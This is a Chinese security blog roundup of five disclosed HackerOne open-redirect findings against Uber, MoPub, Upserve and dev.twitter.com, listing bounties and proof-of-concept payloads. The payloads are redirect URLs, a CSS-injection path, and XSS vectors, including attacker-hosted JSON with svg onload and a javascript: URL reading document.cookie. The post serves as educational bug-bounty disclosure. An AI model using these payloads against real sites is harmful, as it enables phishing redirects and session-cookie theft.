#  hackerone上TOP5的开放重定向漏洞   
原创 骨哥说事  骨哥说事   2024-08-17 00:00  
  
<table><tbody><tr><td width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;">声明：</span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></h1></td></tr></tbody></table>#   
# 博客新域名：https://gugesay.com  
  
******不想错过任何消息？设置星标****↓ ↓ ↓**  
****  
#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
****# 1.central.uber.com的开放重定向漏洞  
- 厂商：Uber  
  
- 赏金奖励：$8,000  
  
- 漏洞披露：未披露  
  
# 2.uber.com 的开放重定向及反射XSS多个漏洞  
- 厂商：Uber  
  
- 赏金奖励：$3,000  
  
- 漏洞披露：  
  
## 开放重定向  
  
开放重定向URL来自 uber.com/en//example.com/  
## CSS 注入  
  
该漏洞通过 URL uber.com/?theme=../en//example.com/css-code.css%23 中的 theme 参数实现，如下所示：  
```
<link rel="stylesheet" id="theme-css" href="https://uber.com/stylesheets/../en//example.com/css-code.css#.css">
```  
  
浏览器将会从 example.com/css-code.css 加载CSS 代码。  
## 反射型XSS  
  
该漏洞是由 API 请求过滤不足而引起，因此，在受控域上，放置了一个包含以下内容的 JSON 文件：  
```
{  
   "id":"9999",
   "title":"XSS on Uber.com",
   "overview":"<svg onload=\"alert('XSS on '+ document.domain)\">",
   "responsibilities":null,
   "qualifications":null,
   "lastUpdated":"2016-01-16 06:29 AM",
   "formattedTeam":"xss",
   "team":"xss",
   "subTeam":"xss",
   "formattedLocation":"xss",
   "slugs":{  
      "team":"xss",
      "subTeam":"xss",
      "city":"xss",
      "country":"xss"
   },
   "city":"xss",
   "country":"xss",
   "jobUrl":"javascript:alert('XSS on '+ document.domain)",
   "normalizedTitle":"xss",
   "normalizedContent":"xss"
}
```  
  
然后在 uber.com/cities/%252e%252e%2f%252e%252e%2fen%2f%2fexample.com%2ffile.json/ 上发现了类似的 XSS 向量。  
  
浏览器尝试从以下位置加载 JSON 内容：example.com/file.jsonuber.com/cities/-CONTROLLED-/ ：  
```
{  
   "products":[  
      {  
         "productDisplayType":"uberx",
         "fare":{  
            "safeRideFee":"USD9999.99",
            "perMinute":"USD9999.99",
            "minimum":"USD9999.99",
            "cancellation":"USD9999.99",
            "fareType":"time_plus_distance",
            "base":"USD9999.99",
            "isDistanceUnitMetric":false,
            "perDistanceUnit":"USD9999.99",
            "additionalFees":[  

            ]
         },
         "displayName":"uberX",
         "tagline":"XSS",
         "taxiFareInfo":false,
         "finePrint":[  
            "XSS"
         ]
      },
      {  
         "productDisplayType":"uberxl",
         "fare":{  
            "safeRideFee":"USD9999.99",
            "perMinute":"USD9999.99",
            "minimum":"USD9999.99",
            "cancellation":"USD9999.99",
            "fareType":"time_plus_distance",
            "base":"USD9999.99",
            "isDistanceUnitMetric":false,
            "perDistanceUnit":"USD9999.99",
            "additionalFees":[  

            ]
         },
         "displayName":"uberXL",
         "tagline":"XSS",
         "taxiFareInfo":false,
         "finePrint":[  
            "XSS"
         ]
      }
   ],
   "flatRates":[  

   ],
   "id":9999,
   "cityId":9999,
   "flatRateDisplayNames":[  

   ],
   "geoJson":null,
   "geoPoint":{  
      "latitude":33.951252,
      "longitude":-83.382943
   },
   "slug":"xss",
   "twitterHandle":null,
   "theme":{  
      "name":"united_states",
      "ctaColor":"#57AD57",
      "patternColor":"#4DB5D9",
      "patternColorBackground":"#A6DAEC"
   },
   "rideContent":"XSS",
   "driveContent":"XSS",
   "impactContent":"XSS",
   "name":"<marquee>XSS</marquee><svg onload=\"alert('XSS on '+ document.domain)\">",
   "pageTitle":"XSS",
   "pageDescription":"XSS",
   "productLegalNotice":null,
   "pageConfiguration":{  

   }
}
```  
# 3. MoPub 登录页的XSS及开放重定向漏洞  
- 厂商：推特  
  
- 赏金奖励：$1,540  
  
- 漏洞披露：  
  
1. URL：https://app.mopub.com/login?next=https://google.com  
  
1. 访问上面的URL并登录  
  
1. 登录成功后将被重定向至google.com  
  
1. 另外还可以通过javascript:alert("xss")实现XSS攻击  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnQbL891t14lWWSUh59flMsgP46DDNvCELzA2TcQibN1CfHNGav2eQsV0Ajj6GZtiafqGsTNqtsMWIw/640?wx_fmt=png&from=appmsg "")  
# 4. Upserve的开放重定向漏洞  
- 厂商：Upserve  
  
- 赏金奖励：$1,200  
  
- 漏洞披露：  
  
https://inventory.upserve.com/http://stanko.sh/  
# 5. dev.twitter.com的XSS及开放重定向漏洞  
- 厂商：推特  
  
- 赏金奖励：$1,120  
  
- 漏洞披露：  
  
PoC：https://dev.twitter.com/https:/%5cblackfan.ru/  
  
XSS PoC:  
  
https://dev.twitter.com//x:1/:///%01javascript:alert(document.cookie)/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnQbL891t14lWWSUh59flMsX7NC4nasvClVVtWn5EeoOJDTzsv3g8KVcy3UPwxlcfgU6H31l5ue9w/640?wx_fmt=png&from=appmsg "")  
  
**加入星球，随时交流：**  
  
****  
**（前50位成员）：99元/年****（前100位成员）：128元/年****（****100位+成员）：199元/年**![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hZj512NN8jnMJtHJnShkTnh3vR3fmaqicPicANic6OEsobrpRjx5vG6mMTib1icuPmuG74h2bxC4eP6nMMzbs5QaSlw/640?wx_fmt=jpeg&from=appmsg "")  
**感谢阅读，如果觉得还不错的话，欢迎分享给更多喜爱的朋友～****====正文结束====**  
  
  
